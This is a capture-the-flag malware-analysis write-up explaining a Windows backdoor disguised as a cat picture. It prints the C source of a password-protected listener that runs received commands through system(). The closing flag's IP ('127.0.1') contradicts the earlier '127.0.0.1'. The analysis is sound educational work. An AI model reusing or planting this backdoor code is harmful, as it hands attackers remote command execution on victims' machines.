---
title: "Beb Tileni"
eventName: "Friendly CTF 2024"
category: "Malware Anlysis"
difficulty: "Medium"
points: 488
---

# Beb Tileni

## Challenge Descritption

Someone sent me this silly cat. He says he can access my bank acount now! Good thing those free bitcoins didnt work. PS: I got back the source code but I still didn't understand it. Flag format: Securinets{MalwareType_SocketIP_Port_Password_ExitCommand} **Note: Although this is a malware, it's totally harmless. Your AV may flag it as malicious but it's totally fine to execute it and analyse it.**

---

## Provided Files

beb.exe (Can't upload a malware here!!)

[chat_mechant.c](/assets/beb_tileni/chat_mechant.c)

---

## TL;DR

**Malware Type:** Backdoor

This is a backdoor since it accepts remote commands and extecutes them on the victim's cmd.
```c
while (password) {
    memset(buffer, 0, 256);
    n = recv(newsockfd, buffer, 255, 0);
    if (n == SOCKET_ERROR) {
        printf("ERROR reading from socket\n");
        closesocket(newsockfd);
        break;
    }

    if (strncmp("shutdown", buffer, 8) == 0) {
        send(newsockfd, "Shutting down.\n", 15, 0);
        password = 0;
        closesocket(newsockfd);
        break;
    }

    system(buffer);
    send(newsockfd, "Command executed.\n", 18, 0);
}
```

**Socket IP:** 127.0.0.1
```c
serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
```

**Password:** who_leaves_their_door_open?
```c
char *correct_password = "who_leaves_their_door_open?";
```

**Exit Command:** shutdown
```c
if (strncmp("shutdown", buffer, 8) == 0) {
    send(newsockfd, "Shutting down.\n", 15, 0);
    password = 0;
    closesocket(newsockfd);
    break;
}

```

**Port Number:** 15233

Execute the malware .exe file, open ressource monitor *(resmon command)* -> network -> listening ports and look for gato.png.exe process. 

**flag: Securinets{Backdoor_127.0.0.1_15233_who_leaves_their_door_open?_shutdown}**

---

## Initial Analysis

For this task, we're provided with the malware executable with a double extension .png.exe to hide its purpose and its source code. Running it will display a picture and fire up a terminal with the message **Never mind me I'm just updation your windows. Take a look at that cat tho!** In malware analysis context, this is a hint that a process is executing in the background and the terminal's message is just a cover for unsespecting users.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <windows.h>
#include <winsock2.h>
```

Scanning the include lines for hints, one library stands out which is the **winsock2.h**. The main program is probably using it to create a socket for remote access for the attacker, possibly a **Remote Access Trojan** or a **Backdoor**...

Upon inspecting the source code, we first notice a **base64_decode** function and its corresponding table, and the **base64_image**. We can guess that these are related to the picture display logic and thus, not interesting for us.

When scrolling down, these lines confirm our logic:

```c
size_t decoded_length;
    unsigned char* decoded_image = base64_decode(base64_image, strlen(base64_image), &decoded_length);
    if (decoded_image == NULL) {
        printf("Failed to decode image.\n");
        return 1;
    }

    FILE* file = fopen("gato_haker.png", "wb");
    if (!file) {
        printf("Failed to open file for writing.\n");
        free(decoded_image);
        return 1;
    }
    fwrite(decoded_image, 1, decoded_length, file);
    fclose(file);
    free(decoded_image);

    ShellExecute(NULL, "open", "gato_haker.png", NULL, NULL, SW_SHOW);
    // So this why it still displayed a cat picture!!
```

Now, scrolling to the juicy part of our code, we can read the few lines that the attacker used to launch a remote socket on the target pc, specifying the necessary parameters.

The following lines demonstrate how the malware creates a socket for the backdoor connection:

```c
// Create the socket for backdoor
sockfd = socket(AF_INET, SOCK_STREAM, 0);
if (sockfd == INVALID_SOCKET) {
    printf("ERROR opening socket\n");
    WSACleanup();
    return 1;
}
```

socket(AF_INET, SOCK_STREAM, 0) creates a TCP socket. If the socket creation fails, it prints an error message and cleans up the Winsock environment, AF_INET specifies that the socket will use IPv4 addresses, while SOCK_STREAM indicates that it will be a stream-oriented socket (TCP).

```c
memset((char *) &serv_addr, 0, sizeof(serv_addr));
serv_addr.sin_family = AF_INET;
serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1"); // Note from author: 127.0.0.1 is your loopback address, you could create a script to test this backdoor on your own pc if you want. You just need to figure out the port.

serv_addr.sin_port = 00000;  // It got lost while reversing the code :(.
// Ressource monitor might be useful they told me.

// Bind the socket to the port
if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) == SOCKET_ERROR) {
    printf("ERROR on binding\n");
    closesocket(sockfd);
    WSACleanup();
    return 1;
}
```

memset initializes the socket address structure to zero.
sin_family sets the address family (IPv4 in this case).
sin_addr.s_addr specifies the IP address of the server, which is set to **127.0.0.1 (localhost)**, meaning the attacker is connecting to the same machine. The port number is not specified in this snippet, which means it needs to be discovered elsewhere (hinted to be found in **Resource Monitor**).

Now to the malicious part of the code:
```c
while (1) {
    listen(sockfd, 5);
    clilen = sizeof(cli_addr);

    // Accept a new connection
    newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
    if (newsockfd == INVALID_SOCKET) {
        printf("ERROR on accept\n");
        closesocket(sockfd);
        WSACleanup();
        return 1;
    }

    memset(buffer, 0, 256);
    n = recv(newsockfd, buffer, 255, 0);
    if (n == SOCKET_ERROR) {
        printf("ERROR reading from socket\n");
        closesocket(newsockfd);
        continue;
    }
```

The listen(sockfd, 5) function makes the socket listen for incoming connections. The **5** indicates the maximum length of the queue for pending connections.
The accept function waits for a connection request, returning a new socket (newsockfd) to communicate with the client.
The buffer is cleared, and data is received from the client into buffer. If an error occurs while reading, it reports the error and continues to listen for new connections.

```c
    // Authenticate with password
    if (strcmp(buffer, correct_password) == 0) {
        password = 1;
        send(newsockfd, "Authenticated!\n", 15, 0);
    } else {
        send(newsockfd, "Incorrect password!\n", 20, 0);
        closesocket(newsockfd);
        continue;
    }
```

The server checks if the received command matches the expected password. If the password is correct, the server sets password to 1 and sends a success message.
If the password is incorrect, it sends an error message and closes the connection, prompting the attacker to retry.

This password is stored in plaintext in the top of the code.

```c
char *correct_password = "who_leaves_their_door_open?";
```

```c
    while (password) {
        memset(buffer, 0, 256);
        n = recv(newsockfd, buffer, 255, 0);
        if (n == SOCKET_ERROR) {
            printf("ERROR reading from socket\n");
            closesocket(newsockfd);
            break;
        }

        if (strncmp("shutdown", buffer, 8) == 0) {
            send(newsockfd, "Shutting down.\n", 15, 0);
            password = 0;
            closesocket(newsockfd);
            break;
        }

        system(buffer);
        send(newsockfd, "Command executed.\n", 18, 0);
    }
}
```

This loop continues as long as the password is valid. It waits for commands from the attacker.

If a command begins with **"shutdown"**, it responds with a shutdown message, sets the password to 0 (disabling the backdoor), and closes the connection.
If the command is anything else, the system(buffer) function executes the command directly in the victim's command line interface (CLI), and a confirmation message is sent back to the attacker.

Now to the "hard" part of the challenge, we need to find the port number.
For this part, it was hinted in the source code that you could use the resource monitor. It comes preinstalled with windows which is great.
According to Wikipedia: *Resource Monitor, a utility in Windows Vista and later, displays information about the use of hardware (CPU, memory, disk, and network) and software (file handles and modules) resources in real time.*

So, for this part of the challenge, we execute the malware .exe file, open ressource monitor *(resmon command)* -> network -> listening ports and look for gato.png.exe process.

![Ressource monitor](/assets/friendly/beb_tileni/Ressource_monitor.png)

Resource monitor is great when it comes to malware analysis. Here's [an article]( https://isc.sans.edu/diary/Diagnosing+Malware+with+Resource+Monitor/13735/) that displays its usage for this kind of tasks.

**Flag: Securinets{Backdoor_127.0.1_15233_who_leaves_their_door_open?_shutdown}**